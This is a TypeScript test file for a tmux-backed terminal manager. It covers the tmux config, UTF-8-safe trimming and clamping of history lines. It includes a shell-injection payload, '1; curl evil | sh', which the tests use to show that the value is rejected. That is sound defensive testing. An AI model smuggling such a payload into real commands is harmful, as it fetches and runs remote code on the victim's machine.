import { describe, it, expect, vi, beforeEach } from 'vitest'

// captureHistory shells out through promisify(execFile) — capture the argv it builds so we can
// prove a hostile `lines` value never reaches the command string.
const execFileCalls: Array<{ file: string; args: string[] }> = []
vi.mock('child_process', () => ({
  execFile: (file: string, args: string[], _opts: unknown, cb: (e: unknown, r: unknown) => void) => {
    execFileCalls.push({ file, args })
    cb(null, { stdout: '', stderr: '' })
  },
  execFileSync: () => ''
}))

import { tmuxConf, trimToBytes, clampHistoryLines, PtyManager } from './pty-manager'

describe('tmuxConf', () => {
  const c = tmuxConf(50000)
  it('leaves the mouse off so drags are xterm\'s own selection', () => {
    expect(c).toContain('set -g mouse off')
    expect(c).not.toContain('set -g mouse on')
  })
  it('binds no mouse keys and no longer shells out to pbcopy', () => {
    expect(c).not.toContain('MouseDragEnd1Pane')
    expect(c).not.toContain('copy-pipe-and-cancel')
    expect(c).not.toContain('pbcopy')
  })
  it('keeps OSC 52 as a safety net for apps that emit it themselves', () => {
    expect(c).toContain('set -g set-clipboard on')
  })
  it('keeps tmux on the NORMAL screen (smcup@/rmcup@) so xterm owns the scrollback', () => {
    // Without this, tmux enters the alternate screen (\x1b[?1049h), which has no scrollback:
    // xterm's scrollback + the hydrated tmux history would both be invisible.
    expect(c).toContain(`set -ga terminal-overrides ',*:smcup@:rmcup@'`)
  })
  it('floors history-limit at 1000', () => {
    expect(tmuxConf(10)).toContain('set -g history-limit 1000')
  })
})

describe('trimToBytes', () => {
  it('returns the text untouched when it is under the cap', () => {
    expect(trimToBytes('hello', 1024)).toBe('hello')
  })
  it('trims from the HEAD (the oldest lines go first)', () => {
    const out = trimToBytes('aaaa\nbbbb\ncccc\n', 10)
    expect(out.endsWith('cccc\n')).toBe(true)
    expect(out).not.toContain('aaaa')
    expect(Buffer.byteLength(out, 'utf-8')).toBeLessThanOrEqual(10)
  })
  it('drops the partial first line when the byte window starts mid-line', () => {
    // A 12-byte window over 15 bytes starts at 'a\nbbbb\ncccc\n' — the head line is partial and
    // must be dropped whole, not emitted as 'a'.
    expect(trimToBytes('aaaa\nbbbb\ncccc\n', 12)).toBe('bbbb\ncccc\n')
  })
  it('never splits a 2-byte character (cap lands mid-character)', () => {
    // 'ü' is 2 bytes; a cap of 9 slices the 100-byte buffer mid-character.
    const out = trimToBytes('ü'.repeat(50), 9)
    expect(out).not.toContain('�')
    expect(Buffer.byteLength(out, 'utf-8')).toBeLessThanOrEqual(9)
  })
  it('never splits a 4-byte character (cap lands mid-character)', () => {
    const out = trimToBytes('😀'.repeat(20), 11)
    expect(out).not.toContain('�')
    expect(Buffer.byteLength(out, 'utf-8')).toBeLessThanOrEqual(11)
  })
  it('honours the cap and stays clean on the no-newline path with multi-byte text', () => {
    for (const cap of [1, 2, 3, 5, 7, 9, 11, 13]) {
      const out = trimToBytes('aü😀b'.repeat(30), cap)
      expect(out, `cap=${cap}`).not.toContain('�')
      expect(Buffer.byteLength(out, 'utf-8'), `cap=${cap}`).toBeLessThanOrEqual(cap)
    }
  })
  it('keeps the newest content when there is no newline at all', () => {
    const out = trimToBytes('abcdefghij', 4)
    expect(out).toBe('ghij')
  })
})

describe('clampHistoryLines', () => {
  it('keeps a sane request', () => {
    expect(clampHistoryLines(200)).toBe(200)
  })
  it('caps at the history ceiling and floors at 1', () => {
    expect(clampHistoryLines(10_000_000)).toBe(5000)
    expect(clampHistoryLines(-5)).toBe(1)
    expect(clampHistoryLines(0)).toBe(5000) // falsy → default
  })
  it('rejects non-numeric / hostile input', () => {
    expect(clampHistoryLines('1; curl evil | sh' as unknown as number)).toBe(5000)
    expect(clampHistoryLines(NaN)).toBe(5000)
    expect(clampHistoryLines(undefined as unknown as number)).toBe(5000)
    expect(clampHistoryLines(12.9)).toBe(12)
  })
})

describe('PtyManager.captureHistory (untrusted `lines`)', () => {
  beforeEach(() => {
    execFileCalls.length = 0
  })
  const withTmux = (): PtyManager => {
    const pm = new PtyManager()
    ;(pm as unknown as { tmuxPath: string }).tmuxPath = '/usr/bin/tmux'
    return pm
  }

  // The `-S` OPERAND is the only untrusted slot: `-1` is always present as the `-E` operand, so
  // assert positionally (a `toContain('-1')` would pass even with the clamp deleted).
  const historyOperand = (call: number): string => {
    const args = execFileCalls[call].args
    return args[args.indexOf('-S') + 1]
  }

  it('never lets a shell-injection payload reach the tmux argv', async () => {
    await withTmux().captureHistory('n1', '1; curl evil | sh' as unknown as number)
    const argv = execFileCalls[0].args.join(' ')
    expect(argv).not.toContain('curl')
    expect(argv).not.toContain(';')
    expect(historyOperand(0)).toBe('-5000')
  })

  it('clamps negative / NaN / oversized values to a sane integer', async () => {
    const pm = withTmux()
    await pm.captureHistory('n1', -1)
    expect(historyOperand(0)).toBe('-1') // floored to 1 line; without the clamp this would be `--1`
    await pm.captureHistory('n1', NaN)
    expect(historyOperand(1)).toBe('-5000')
    await pm.captureHistory('n1', 10_000_000)
    expect(historyOperand(2)).toBe('-5000')
    await pm.captureHistory('n1', 12.9)
    expect(historyOperand(3)).toBe('-12')
  })

  it('keeps the exact capture command shape on the local path', async () => {
    await withTmux().captureHistory('n1', 200)
    const argv = execFileCalls[0].args.join(' ')
    // `-J` unwraps the host pane's hard wrap (a narrower client re-wraps the fragments into
    // ragged nonsense otherwise); `-E -1` excludes the visible screen, which tmux repaints itself
    // on attach — the seed pushes the history above the fold so the redraw overwrites nothing.
    expect(argv).toContain('capture-pane -p -e -J -t nt-n1 -S -200 -E -1')
  })
})
